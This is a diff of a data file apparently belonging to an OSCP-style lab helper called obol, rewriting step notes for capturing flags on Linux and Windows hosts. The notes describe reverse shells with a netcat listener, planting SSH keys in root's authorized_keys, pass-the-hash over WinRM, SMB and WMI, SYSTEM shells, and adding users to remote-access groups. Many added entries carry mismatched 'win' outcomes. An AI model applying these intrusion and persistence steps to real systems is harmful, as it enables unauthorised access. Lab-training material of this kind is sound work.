@@ -23,77 +23,146 @@
   OBOL.FIELD_NOTES = {
   "flag-hunt-linux": [
     {
+      "when": "SSH INTERACTIVE SHELL (When port 22 is open and credentials are known)",
       "land": [
-        "You already have a shell, so just read the flag. No credential needed.",
-        "Print your identity (id) and the target IP next to the flag so one screenshot proves all three."
+        "Log in directly to an interactive shell on the target host."
       ],
-      "mistakes": [
-        "Capturing only the flag value, with no id or IP in the same frame."
-      ],
-      "win": "The flag value prints under your id and the interface IP."
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     },
     {
+      "when": "ENABLE SSH KEY LOGIN (From remote command execution)",
       "land": [
-        "Only for when you hold SSH creds but have no shell yet. This runs from Kali, so it only LOCATES the flag.",
-        "Note the path it prints, then get a shell and read it on the host."
+        "Authorize your Kali SSH public key on the target account so you can SSH in interactively."
       ],
-      "mistakes": [
-        "Treating this remote read as the capture. A flag read from Kali scores zero on the exam."
-      ],
-      "win": "A path like /home/user/user.txt prints. Now capture it in a shell on the box."
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     },
     {
+      "when": "REVERSE SHELL UPGRADE (From one-shot remote execution)",
       "land": [
-        "Run this INSIDE your shell on the target, not from Kali.",
-        "id + ip addr + the flag, together, is the report screenshot."
+        "Catch an interactive shell on your Kali listener (`nc -lvnp {{lport}}`)."
       ],
-      "mistakes": [
-        "Running it over a one-shot remote exec instead of in your session."
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "IN YOUR SHELL (no credential needed)",
+      "land": [
+        "find every flag file and print the user flag with your identity for the screenshot. The common case - you do not need SSH creds to read a flag you can already reach."
       ],
-      "win": "The flag prints beneath uid= and the target IP in your own session."
+      "mistakes": [],
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
+    },
+    {
+      "when": "From Kali against the target service.",
+      "land": [
+        "LOCATE OVER SSH (only if you hold SSH creds and have no shell yet). A one-liner from Kali, so it only LOCATES; OffSec scores a flag read this way ZERO. Paste the output back and obol records the path; capture it on the host next."
+      ],
+      "mistakes": [],
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
+    },
+    {
+      "when": "Inside an interactive session on the target host.",
+      "land": [
+        "ON THE HOST, capture the LOCAL/user flag with its identity. Run this INSIDE your shell and screenshot the whole frame: whoami + id + ip addr (the target IP) + the flag, together. obol records this as the captured local flag."
+      ],
+      "mistakes": [],
+      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
+    },
+    {
+      "when": "REMOTE SSH PROOF READ (from Kali)",
+      "land": [
+        "Run id, hostname, ip addr, and cat the located user flag over SSH via NetExec."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     }
   ],
   "flag-hunt-root-linux": [
     {
+      "when": "ROOT SSH INTERACTIVE SHELL (When port 22 is open)",
       "land": [
-        "You are root now, so read the proof flag in /root before you do anything else.",
-        "id must show uid=0 in the same screenshot as the flag."
-      ],
-      "mistakes": [
-        "Forgetting to prove uid=0 alongside the flag."
-      ],
-      "win": "The root flag prints beneath uid=0(root)."
-    },
-    {
-      "land": [
-        "If the exact path was not located yet, sweep for it now that /root is readable."
+        "Connect directly to an interactive root shell over SSH."
       ],
       "mistakes": [],
-      "win": "The sweep turns up the proof file and prints it."
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "AUTHORIZE ROOT SSH KEY (From remote command execution)",
+      "land": [
+        "Plant your Kali SSH public key into /root/.ssh/authorized_keys to open an interactive root SSH session."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "ROOT REVERSE SHELL UPGRADE (From remote command execution)",
+      "land": [
+        "Catch an interactive root shell on your Kali listener (`nc -lvnp {{lport}}`)."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "IN YOUR ROOT SHELL",
+      "land": [
+        "locate the root/proof flag and print it alongside your root identity and IP address for the report screenshot."
+      ],
+      "mistakes": [],
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
+    },
+    {
+      "when": "Inside an interactive session on the target host.",
+      "land": [
+        "ON THE HOST as root, capture the ROOT flag with its identity. Run this INSIDE your root shell and screenshot the whole frame together (id must show uid=0). obol records this as the captured root flag - the box's final objective."
+      ],
+      "mistakes": [],
+      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
+    },
+    {
+      "when": "COMBINED USER + ROOT PROOF READ (In-Session)",
+      "land": [
+        "Print host identity, IP, local flag, and root flag in one terminal frame when both paths have been located."
+      ],
+      "mistakes": [],
+      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
+    },
+    {
+      "when": "REMOTE SSH LOCATE (from Kali)",
+      "land": [
+        "Search /root for the root/proof flag over SSH via NetExec when root SSH credentials are known."
+      ],
+      "mistakes": [],
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
+    },
+    {
+      "when": "REMOTE SSH PROOF READ (from Kali)",
+      "land": [
+        "Run id, hostname, ip addr, and cat the located root flag over SSH via NetExec."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     }
   ],
   "flag-hunt-windows": [
     {
-      "when": "When port 5985 is open and you hold a domain or local password.",
+      "when": "WINRM INTERACTIVE SHELL (Recommended when port 5985 is open)",
       "land": [
-        "Connects directly over WinRM and drops you into an interactive PowerShell session ON the box.",
-        "Once inside, run the locate step below, then capture the flag with hostname and ipconfig for the report."
+        "Connect directly over WinRM with domain credentials. Once connected, locate and capture the user flag."
       ],
-      "mistakes": [
-        "Reading the flag remotely from Kali when OffSec requires an interactive shell screenshot."
-      ],
-      "win": "You land at an *Evil-WinRM* PS prompt on the target."
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     },
     {
-      "when": "When you hold a hash or credential but have no shell yet, and you want an OSCP-honest capture.",
+      "when": "WINRM PASS-THE-HASH SHELL",
       "land": [
-        "Use the NT hash you dumped (-H, not -p). This drops you into a real session ON the box.",
-        "That session is the point: the exam only counts a flag you read from a shell on the target."
+        "Connect directly over WinRM with a captured NT hash."
       ],
       "mistakes": [
-        "Pasting the whole LM:NT hash. evil-winrm wants only the NT half."
+        "Pasting the full LM:NT hash instead of the 32-hex NT hash."
       ],
-      "win": "You land at an *Evil-WinRM* PS prompt on the target.",
+      "win": "You land an interactive session on the target host.",
       "doctor": {
         "title": "If evil-winrm Dies On Connect",
         "body": "A `CLIENT_TO_SERVER_SEALING` crash the instant it connects on a fresh Kali is the rubyntlm 0.6.7 bug (auth already succeeded), not your hash. Update the gem, then re-run:",
@@ -101,288 +170,434 @@
       }
     },
     {
-      "when": "FIRST, before you read. The user flag lives on some user's Desktop, and as admin that is not you, so search for it.",
+      "when": "RDP INTERACTIVE DESKTOP (When port 3389 is open)",
       "land": [
-        "Run it in your WinRM/PowerShell session. It lists every matching flag file across all user Desktops.",
-        "Paste the path it prints: obol fills the read above with the real location."
+        "Open a full interactive RDP desktop session on the target host."
       ],
-      "mistakes": [
-        "Skipping the search and reading a guessed path (the Forest trap: user.txt is on svc-alfresco's Desktop, not Administrator's)."
-      ],
-      "win": "A real path like `C:\\Users\\svc-alfresco\\Desktop\\user.txt` prints. The read step above lights up, filled."
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     },
     {
-      "when": "Once you have LOCATED the user flag (the search step below). This reads the real path obol found, so it is blank until you search.",
+      "when": "PORT 135/445 WMI INTERACTIVE SHELL (When WinRM 5985 is closed)",
       "land": [
-        "Run it in your shell ON the host. obol fills the exact path from your locate, so you never type a Desktop that is not there.",
-        "hostname + ipconfig next to the flag is the report screenshot."
+        "Spawns a semi-interactive C:\\> prompt over WMI and SMB."
       ],
-      "mistakes": [
-        "Capturing the value without hostname/ipconfig in the same frame.",
-        "Guessing the path. The user flag is almost never on YOUR Desktop once you are admin, so locate first."
-      ],
-      "win": "The flag prints under your hostname and the target IP."
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     },
     {
-      "when": "When port 5985 is open and you want to locate user.txt from Kali in one command.",
+      "when": "PORT 445 INTERACTIVE SYSTEM SHELL",
       "land": [
-        "Searches all user profile directories over WinRM and prints the full path to user.txt.",
-        "Paste the output into Obol so {{flag_path_local}} fills automatically."
+        "Spawns an interactive command prompt over SMB."
       ],
-      "mistakes": [
-        "Stopping after locating the path without reading the flag contents."
-      ],
-      "win": "A path like C:\\Users\\svc\\Desktop\\user.txt prints."
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     },
     {
-      "when": "Once {{flag_path_local}} is known and you want a fast remote read over WinRM.",
+      "when": "PORT 445 SMBEXEC SHELL",
       "land": [
-        "Reads the confirmed user flag file over WinRM in a single shot from Kali."
+        "Opens a semi-interactive SYSTEM shell over port 445 without dropping a service binary on disk."
       ],
-      "mistakes": [
-        "Using a remote one-liner without an interactive host proof when exam rules require a full shell frame."
-      ],
-      "win": "The 32-hex user flag prints from WinRM."
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     },
     {
-      "when": "When you hold an NT hash (no plaintext password) and want to read {{flag_path_local}} over WinRM.",
+      "when": "ENABLE WINRM / RDP GROUP ACCESS (Fallback when direct login is blocked by group policy)",
       "land": [
-        "Passes the NT hash directly to WinRM and prints the user flag."
+        "Grants your user Remote Management Users and Remote Desktop Users membership and enables RDP."
       ],
-      "mistakes": [
-        "Passing LM:NT instead of the 32-hex NT hash when a single hash token is expected."
-      ],
-      "win": "The user flag prints over WinRM via pass-the-hash."
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     },
     {
-      "when": "When a low-privileged domain credential can read the Users SMB share and WinRM is closed.",
+      "when": "REVERSE SHELL UPGRADE",
       "land": [
-        "Downloads user.txt straight from the Users share over SMB without needing remote code execution."
+        "Execute from a one-shot command runner or service to catch an interactive shell on your Kali listener (`nc -lvnp {{lport}}`)."
       ],
-      "mistakes": [
-        "Assuming you need admin rights when the Users share is readable by standard domain users."
-      ],
-      "win": "user.txt downloads and prints locally."
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     },
     {
-      "when": "When you hold a hash or credential but have no shell yet. Runs from Kali, so it only LOCATES the flag file.",
+      "when": "Inside an interactive session on the target host.",
       "land": [
-        "Note the path, then get on the host to read it for the report."
+        "UNIVERSAL IN-SESSION LOCATE (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Sweep all user Desktops for the user/local flag file in under 1 second."
       ],
-      "mistakes": [
-        "Treating the spider output as the capture. A remote read scores zero for OffSec."
-      ],
-      "win": "A path like `Users\\svc\\Desktop\\user.txt` prints. Switch to On-Host to grab it."
+      "mistakes": [],
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
     },
     {
-      "when": "When you hold administrative credentials on SMB and need to locate user.txt or local.txt across all profiles.",
+      "when": "IN-SESSION POWERSHELL LOCATE (For PS C",
       "land": [
-        "Sweeps every user's Desktop directory in under a second over SMB.",
-        "Paste the output so Obol locks in {{flag_path_local}}."
+        "\\> shells like Evil-WinRM): Inside your interactive shell, recursively search user profiles to verify the exact path of the user flag. Paste the path it prints and obol fills the read below."
       ],
-      "mistakes": [
-        "Running SMB -x with a non-admin account (SMB command execution requires local admin)."
-      ],
-      "win": "The exact Desktop path to user.txt or local.txt prints."
+      "mistakes": [],
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
     },
     {
-      "when": "A LAB shortcut (not OffSec-legal) when you hold the dumped Administrator hash and just want the value.",
+      "when": "Inside an interactive session on the target host.",
       "land": [
-        "Searches every user Desktop and prints the flag in one shot, no shell. obol fills the hash and the flag names for you."
+        "UNIVERSAL IN-SESSION PROOF READ (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Display whoami, hostname, ipconfig, and the located user flag in one command frame for the report screenshot."
       ],
       "mistakes": [
-        "Using this on the exam. A remote read earns zero: for OffSec, locate then capture ON the host."
+        "Using semicolons (;) inside a CMD/wmiexec shell, which causes whoami to fail with ERROR: Invalid argument/option - ';'.",
+        "Capturing only the flag value without whoami, hostname, and ipconfig in the same screenshot frame."
       ],
-      "win": "The flag value prints straight away, with no session."
+      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
     },
     {
-      "when": "When port 3389 (RDP) is open and you want whoami, hostname, ipconfig, and the user flag in one command.",
+      "when": "IN-SESSION POWERSHELL PROOF READ (For PS C",
       "land": [
-        "Executes the full identity and flag proof chain over RDP via NetExec without manually opening a GUI client."
+        "\\> shells like Evil-WinRM or powershell.exe): Display user identity (whoami), host identity (hostname), IP (ipconfig), and the located user flag in the same frame for the report screenshot."
       ],
       "mistakes": [
-        "Running before {{flag_path_local}} is known."
+        "Running this semicolon-separated PowerShell syntax inside cmd.exe or impacket-wmiexec (use the universal cmd /c command instead)."
       ],
-      "win": "Identity, IP configuration, and the user flag print together from RDP."
+      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
     },
     {
-      "when": "When port 3389 is open and you want an automated PNG desktop screenshot for your report.",
+      "when": "WINRM REMOTE LOCATE (When port 5985 is open)",
       "land": [
-        "Captures the live RDP desktop session to ~/.nxc/screenshots/ and records the file path in Obol.",
-        "Open Evidence -> Proof Screenshots to copy the path and attach the PNG directly to the local.txt slot."
+        "Search user profiles for the user flag remotely over WinRM in one command without opening an interactive shell."
       ],
-      "mistakes": [
-        "Using too short a screentime when the Windows desktop takes several seconds to render."
+      "mistakes": [],
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
+    },
+    {
+      "when": "WINRM REMOTE READ (When port 5985 is open)",
+      "land": [
+        "Read the confirmed user flag directly over WinRM in one shot from Kali."
       ],
-      "win": "NetExec saves a PNG screenshot and Obol surfaces the path in Evidence."
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "WINRM REMOTE READ WITH NT HASH",
+      "land": [
+        "Read the confirmed user flag over WinRM using pass-the-hash."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "LOCATE OVER SMB (from Kali)",
+      "land": [
+        "Spiders the Users share to locate the exact path of the user/local flag file before reading it."
+      ],
+      "mistakes": [],
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
+    },
+    {
+      "when": "SMB SHARE CAPTURE (Ungates once the flag path is located on the Users share)",
+      "land": [
+        "Downloads and prints the located user flag from the discovered share path."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "REMOTE LOCATE OVER SMB",
+      "land": [
+        "Searches every user profile Desktop over SMB. Note: Requires administrative execution rights on the target; if execution fails on non-admin accounts, use evil-winrm."
+      ],
+      "mistakes": [],
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
+    },
+    {
+      "when": "LAB QUICK GRAB (not OffSec-legal)",
+      "land": [
+        "with the dumped Administrator hash, search every user's Desktop and print the flag remotely in one shot, no shell. obol fills the hash from the NTDS dump, no credential swap, and the names from your profile."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "RDP REMOTE PROOF READ (When port 3389 is open)",
+      "land": [
+        "Run whoami, hostname, ipconfig, and type the user flag in one command over RDP via NetExec."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "RDP DESKTOP SCREENSHOT",
+      "land": [
+        "Capture a PNG screenshot of the remote RDP desktop session (saved under ~/.nxc/screenshots/) to attach in Evidence -> Proof Screenshots."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     }
   ],
   "flag-hunt-root-windows": [
     {
-      "when": "Only if the proof flag is NOT on Administrator's Desktop (rare).",
+      "when": "PREFERRED REMOTE LOCATE (Instant Desktop Sweep with NT Hash over SMB)",
       "land": [
-        "Searches every Desktop for your profile's flag names. Paste the path and the reads above fill with it."
+        "Scans every user profile Desktop for root/proof flags using the Administrator NT hash. Finishes in under 1 second. Paste output to ungate the flag read."
       ],
       "mistakes": [],
-      "win": "The search finds proof.txt / root.txt and prints its path."
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
     },
     {
-      "when": "When port 5985 is open and you want to locate root.txt over WinRM using the Administrator NT hash.",
+      "when": "WINRM REMOTE LOCATE WITH NT HASH (When port 5985 is open)",
       "land": [
-        "Runs a recursive PowerShell search across C:\\Users over WinRM and prints the exact path to the root flag."
+        "Fast PowerShell sweep over WinRM with the Administrator hash to find root/proof flags."
       ],
       "mistakes": [],
-      "win": "The full path to root.txt or proof.txt prints over WinRM."
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
     },
     {
-      "when": "When SMB/WinRM are restricted and you want to locate root.txt or proof.txt over WMI with the Administrator hash.",
+      "when": "WMI REMOTE LOCATE WITH NT HASH",
       "land": [
-        "Sweeps every user profile Desktop over WMI (port 135) and prints the matching flag path."
+        "Sweep user profiles for root/proof flags over WMI using the Administrator NT hash."
       ],
       "mistakes": [],
-      "win": "The root/proof flag path prints over WMI."
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
     },
     {
-      "when": "When you hold an administrative password and want to locate root.txt or proof.txt over WMI.",
+      "when": "PREFERRED REMOTE LOCATE (Instant Desktop Sweep over WMI)",
       "land": [
-        "Scans every user Desktop over WMI without traversing slow system directories."
+        "Scans every user profile Desktop for root/proof flags without scanning deep subdirectories when administrative password is known. Finishes in under 1 second. Paste output to ungate the flag read."
       ],
       "mistakes": [],
-      "win": "The exact path to root.txt or proof.txt prints."
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
     },
     {
-      "when": "When you hold an administrative password and want to locate root.txt or proof.txt over SMB.",
+      "when": "REMOTE LOCATE (Instant Desktop Sweep over SMB)",
       "land": [
-        "Scans every user Desktop over SMB and fills {{flag_path_root}} once pasted."
+        "Searches every user profile Desktop over SMB without traversing junction points or deep directories when administrative password is known."
       ],
       "mistakes": [],
-      "win": "The exact path to root.txt or proof.txt prints over SMB."
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
     },
     {
-      "when": "The moment you are SYSTEM/Administrator and want the proof flag without a shell.",
+      "when": "PREFERRED SMB HASH READ",
       "land": [
-        "Reads the root flag over SMB with the dumped Administrator hash. obol fills the hash and the path for you, no credential swap.",
-        "Avoids the evil-winrm sealing bug entirely."
+        "With the Administrator NT hash dumped from NTDS, read the located root flag remotely over SMB."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "WINRM REMOTE READ WITH NT HASH",
+      "land": [
+        "Read the located root flag over WinRM using the Administrator NT hash."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "PREFERRED WMI EXECUTION (When WinRM is closed)",
+      "land": [
+        "Read the located root flag directly over WMI (port 135) with administrative credentials."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "From Kali against the target service.",
+      "land": [
+        "Remote read over SMB with administrative password."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "From Kali against the target service.",
+      "land": [
+        "Fallback remote read with the DA hash via impacket wmiexec."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "WINRM INTERACTIVE SHELL (When port 5985 is open or enabled)",
+      "land": [
+        "Connect directly over WinRM with administrative credentials."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "WINRM PASS-THE-HASH SHELL (Recommended when port 5985 is open)",
+      "land": [
+        "Connect directly over WinRM with the Administrator NT hash."
       ],
       "mistakes": [
-        "Switching your active credential to Administrator by hand. obol already fills the dumped hash."
+        "Pasting the full LM:NT hash instead of the 32-hex NT hash."
       ],
-      "win": "The proof/root flag value prints from Kali."
+      "win": "You land an interactive session on the target host."
     },
     {
-      "when": "When port 5985 is open and you want to read {{flag_path_root}} over WinRM with the Administrator hash.",
+      "when": "RDP INTERACTIVE DESKTOP (When port 3389 is open)",
       "land": [
-        "Reads the located root/proof flag over WinRM via pass-the-hash in a single command."
-      ],
-      "mistakes": [],
-      "win": "The root/proof flag value prints over WinRM."
-    },
-    {
-      "when": "When WinRM is closed and you hold an administrative password to read {{flag_path_root}} over WMI.",
-      "land": [
-        "Executes type against the located root flag over WMI (port 135) with no service binary dropped."
+        "Open a full interactive Administrator RDP desktop session."
       ],
       "mistakes": [],
-      "win": "The root/proof flag value prints over WMI."
+      "win": "You land an interactive session on the target host."
     },
     {
-      "when": "When you hold an administrative password and want to read {{flag_path_root}} over SMB.",
+      "when": "PORT 135/445 WMI INTERACTIVE SHELL (Recommended when WinRM 5985 is closed, e.g. Active)",
       "land": [
-        "Reads the confirmed root/proof flag directly over SMB."
+        "Spawns a semi-interactive C:\\> prompt over WMI and SMB using administrative credentials."
       ],
       "mistakes": [],
-      "win": "The root/proof flag value prints over SMB."
+      "win": "You land an interactive session on the target host."
     },
     {
-      "when": "A fallback remote read if nxc is unavailable.",
+      "when": "PORT 135/445 WMI PASS-THE-HASH SHELL",
       "land": [
-        "Same DA hash, via impacket wmiexec. Semi-interactive wmiexec works too."
+        "Spawns a semi-interactive C:\\> prompt over WMI and SMB using the Administrator NT hash."
       ],
       "mistakes": [],
-      "win": "The root flag prints from the wmiexec call."
+      "win": "You land an interactive session on the target host."
     },
     {
-      "when": "When port 5985 is open and you need an interactive Administrator session via pass-the-hash for your report screenshot.",
+      "when": "PORT 445 INTERACTIVE SYSTEM SHELL",
       "land": [
-        "Connects as Administrator using the NT hash (-H) so you can run the on-host proof read inside a real shell."
+        "Creates a service over SMB and opens an interactive shell running as NT AUTHORITY\\SYSTEM."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "PORT 445 PASS-THE-HASH SYSTEM SHELL",
+      "land": [
+        "Opens an interactive NT AUTHORITY\\SYSTEM shell over SMB using the Administrator NT hash."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "PORT 445 SMBEXEC SHELL",
+      "land": [
+        "Opens a semi-interactive SYSTEM shell over port 445 without dropping a service binary on disk."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "ENABLE RDP & WINRM GROUP ACCESS REMOTELY",
+      "land": [
+        "Adds your account to Remote Desktop Users and Remote Management Users and enables RDP on the host."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "ENABLE RDP & WINRM GROUP ACCESS WITH NT HASH",
+      "land": [
+        "Grants Remote Desktop Users and Remote Management Users and enables RDP using the Administrator NT hash."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "REVERSE SHELL UPGRADE",
+      "land": [
+        "Run inside your wmiexec/psexec session or via remote execution to catch a full PowerShell reverse shell on your Kali listener (`nc -lvnp {{lport}}`)."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "Inside an interactive session on the target host.",
+      "land": [
+        "UNIVERSAL ON-HOST LOCATE (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Sweep all user profile Desktops for root/proof and user/local flags in under 1 second."
+      ],
+      "mistakes": [],
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
+    },
+    {
+      "when": "Inside an interactive session on the target host when you want both user and root flags located and printed in a single command.",
+      "land": [
+        "ONE-SHOT ON-HOST USER + ROOT LOCATE & PROOF READ (Works in CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM without needing paths first): Prints whoami, hostname, ipconfig, and every user/local and root/proof flag across all Desktops in one frame."
+      ],
+      "look": [
+        "Each --- C:\\Users\\...\\Desktop\\*.txt --- marker followed by the 32-hex flag value alongside whoami, hostname, and ipconfig."
       ],
       "mistakes": [
-        "Pasting LM:NT instead of the 32-hex NT hash."
+        "Running only type on a guessed path before confirming which profile holds user.txt and root.txt."
       ],
-      "win": "You land at an *Evil-WinRM* PS prompt as Administrator."
+      "win": "Identity, hostname, IP configuration, and both user and root flags print together in one frame."
     },
     {
-      "when": "When port 5985 is open and you hold an administrative plaintext password.",
+      "when": "ON-HOST POWERSHELL LOCATE (For PS C:\\> shells like Evil-WinRM)",
       "land": [
-        "Opens an interactive Evil-WinRM session so you can capture the proof flag with whoami, hostname, and ipconfig."
+        "If you have an interactive PowerShell session, search Desktops for root/proof flag files in under 1 second. Paste the path it prints to ungate the read command below."
       ],
       "mistakes": [],
-      "win": "You land at an elevated *Evil-WinRM* PS prompt."
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
     },
     {
-      "when": "Inside your interactive elevated PowerShell session when you need to verify the exact path to root.txt or proof.txt.",
+      "when": "Inside an interactive session on the target host.",
       "land": [
-        "Searches all Desktop folders in under a second and prints the full path."
+        "UNIVERSAL ON-HOST PROOF READ (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): Capture whoami, hostname, ipconfig, and the ROOT/proof flag in a single command frame."
+      ],
+      "mistakes": [
+        "Using semicolons (;) inside a CMD/wmiexec shell, which causes whoami to fail with ERROR: Invalid argument/option - ';'.",
+        "Capturing only the flag value without whoami, hostname, and ipconfig in the same screenshot frame."
+      ],
+      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
+    },
+    {
+      "when": "Inside an interactive session on the target host.",
+      "land": [
+        "COMBINED USER + ROOT PROOF READ (Works in both CMD/wmiexec/psexec/smbexec and PowerShell/Evil-WinRM): If you initially grabbed the user flag over SMB without an interactive shell, run this inside your Admin shell to capture both user and root flags alongside whoami, hostname, and ipconfig for your exam report."
+      ],
+      "mistakes": [
+        "Using semicolons (;) inside a CMD/wmiexec shell, which causes whoami to fail with ERROR: Invalid argument/option - ';'.",
+        "Capturing only the flag value without whoami, hostname, and ipconfig in the same screenshot frame."
+      ],
+      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
+    },
+    {
+      "when": "Inside an interactive session on the target host.",
+      "land": [
+        "ON THE HOST as SYSTEM/Administrator (PowerShell / Evil-WinRM), capture the ROOT/proof flag with its identity in the same frame (whoami + hostname + ipconfig + the flag) for the report."
+      ],
+      "mistakes": [
+        "Running this semicolon-separated PowerShell syntax inside cmd.exe or impacket-wmiexec (use the universal cmd /c command instead)."
+      ],
+      "win": "Identity, hostname, IP configuration, and the flag value print together in one frame."
+    },
+    {
+      "when": "ON-HOST ADS LOCATE (Alternate Data Streams)",
+      "land": [
+        "Lists files and hidden alternate data streams on the Administrator Desktop. If flag files are hidden in streams (e.g. filename.txt:root.txt:$DATA), dir /r exposes them."
       ],
       "mistakes": [],
-      "win": "The full path to root.txt or proof.txt prints in your shell."
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
     },
     {
-      "when": "For the report proof: capture the root flag inside a shell ON the host.",
+      "when": "POWERSHELL ADS LOCATE",
       "land": [
-        "You are SYSTEM/Administrator now, so grab the proof flag.",
-        "whoami + hostname + ipconfig + the flag, together, is the report screenshot."
-      ],
-      "mistakes": [
-        "Not proving the elevated identity (whoami) alongside the flag."
-      ],
-      "win": "The proof flag prints beneath whoami showing SYSTEM or Administrator."
-    },
-    {
-      "when": "When root.txt appears empty or missing on Administrator's Desktop, indicating an NTFS Alternate Data Stream (ADS).",
-      "land": [
-        "Run dir /r in cmd.exe to reveal hidden :$DATA streams attached to files or folders on the Desktop."
-      ],
-      "mistakes": [
-        "Running dir without /r, which hides alternate data streams."
-      ],
-      "win": "A hidden stream like filename.txt:root.txt:$DATA is listed."
-    },
-    {
-      "when": "Inside PowerShell when hunting for flags hidden in NTFS Alternate Data Streams.",
-      "land": [
-        "Lists every non-default stream across files on the Administrator Desktop and populates {{filename}} and {{stream_name}}."
+        "Enumerates NTFS alternate data streams across all files in the Administrator desktop, filtering out the default :$DATA stream."
       ],
       "mistakes": [],
-      "win": "The hidden FileName and Stream name print."
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
     },
     {
-      "when": "Once an NTFS Alternate Data Stream flag has been identified.",
+      "when": "POWERSHELL ADS READ",
       "land": [
-        "Reads the hidden stream content directly in PowerShell."
-      ],
-      "mistakes": [
-        "Using regular type or Get-Content without -Stream, which only reads the default stream."
-      ],
-      "win": "The 32-hex root flag hidden in the alternate stream prints."
-    },
-    {
-      "when": "When port 3389 (RDP) is open and you want whoami, hostname, ipconfig, and the root/proof flag in one command.",
-      "land": [
-        "Executes the elevated identity and proof flag read over RDP via NetExec."
-      ],
-      "mistakes": [
-        "Running before {{flag_path_root}} is confirmed."
-      ],
-      "win": "Elevated identity, IP configuration, and the proof flag print together from RDP."
-    },
-    {
-      "when": "When port 3389 is open and you want an automated PNG desktop screenshot for your proof.txt report slot.",
-      "land": [
-        "Captures the elevated RDP session to ~/.nxc/screenshots/ and surfaces the path in Evidence -> Proof Screenshots."
+        "Reads the contents of a hidden alternate data stream flag (e.g. -Stream root.txt)."
       ],
       "mistakes": [],
-      "win": "NetExec saves a PNG screenshot and Obol links it for the proof.txt slot."
+      "win": "The exact path to the flag file prints and unlocks the proof read step."
+    },
+    {
+      "when": "RDP REMOTE PROOF READ (When port 3389 is open)",
+      "land": [
+        "Run whoami, hostname, ipconfig, and type the root/proof flag in one command over RDP via NetExec."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
+    },
+    {
+      "when": "RDP DESKTOP SCREENSHOT",
+      "land": [
+        "Capture a PNG screenshot of the remote Administrator RDP desktop session (saved under ~/.nxc/screenshots/) to attach in Evidence -> Proof Screenshots."
+      ],
+      "mistakes": [],
+      "win": "You land an interactive session on the target host."
     }
   ],
   "recon-smb-anon": [
@@ -1749,6 +1964,19 @@
       "mistakes": [
         "Treating every SUID file as a lead. The stock ones are noise; the outlier is the lead."
       ]
+    },
+    {
+      "when": "From Kali over SSH when you want a one-shot non-interactive triage before opening a full shell.",
